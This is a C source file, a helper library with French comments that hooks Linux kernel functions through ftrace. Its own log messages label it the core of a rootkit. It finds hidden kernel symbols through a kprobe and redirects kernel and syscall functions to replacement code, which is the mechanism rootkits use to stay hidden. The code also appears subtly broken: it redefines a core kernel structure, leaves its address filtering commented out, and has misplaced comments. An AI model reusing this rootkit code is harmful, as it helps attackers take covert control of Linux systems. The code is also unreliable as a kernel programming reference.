/*
 * Helper library for ftrace hooking kernel functions
 * Author: Harvey Phillips (xcellerator@gmx.com)
 * Edited by: Victor
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <net/tcp.h>

// check la version du kernel, pt_regs pour les syscall en 4.17 ou plus
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

// en 5.7 ou +, kallsyms_lookup_name (qui sert a récupe l'adr d'un f°) est plus dispo, mais kprobes peut faire le job
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
//on intercepte ici la f° kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif
struct ftrace_hook;

// macro qui prends le nom de la f°, la f° de remplacement et la f° d'origine
#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

// On évite les récursions pour le boucles infinies
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_ops {
    void (*func)(unsigned long, unsigned long, struct ftrace_ops *, struct pt_regs *);
    unsigned long flags;
    struct module *owner;
};

// f° qui def les hooks ftrace (nom de la f°, f° de remplacement, f° d'origine)
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    // adr mem de la f°
    unsigned long address;
    //obj ftrace pour interagir avec la f° ftrace
    struct ftrace_ops ops;
};

int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

// f° qui résoud l'adr de la f° a hook
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;    
    unregister_kprobe(&kp);
#endif
    // ensuite on stock l'adr de la f° dans hook->address
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {   
        // si on trouve pas l'adr, on affiche un msg d'erreur erreur no entity
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

// si on a pas trouvé l'adr, on retourne 0  
#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

// fonction qui redirige l'exécution vers la nouvelle fonction définie dans le hook
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    // récup le pointeur vers la struct ftrace_hook depuis ops
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    //modifie le pointeur d'instruction en redirigeant ainsi le flux d'exécution vers la fonction hookée
    regs->ip = (unsigned long) hook->function;
#else
    // on vérifie si l'adr de la f° est dans le module courant
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;

    // Check if the flags are defined before using them
#ifdef FTRACE_OPS_FL_SAVE_REGS
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
#elif defined(FTRACE_OPS_FL_RECURSION_SAFE) && defined(FTRACE_OPS_FL_IPMODIFY)
    hook->ops.flags = FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
#else
    // Handle case where flags are not defined
    hook->ops.flags = 0;  // Or use some default flag setting
#endif

    // err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    // if (err) {
    //     printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    //     return err;
    // }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

// fais l'inverse de fh_install_hook
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    //désenregistre le hook
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    // supprime l'adr de la fonction hookée de la liste des adr filtrées
    // err = ftrace_set_filter_ip(hooks[i].function, hooks[i].replace, 0, 0);
    // if(err)
    // {
    //     printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    // }
}

// installe plusieurs hooks (itère dans un tableau pour les installer un par un)
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {   
        // on installe le hook
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {   
        // si on a une erreur, on enlève les hooks un par un
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

// fait l'inverse de fh_install_hooks (enlève les hooks un par un)
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}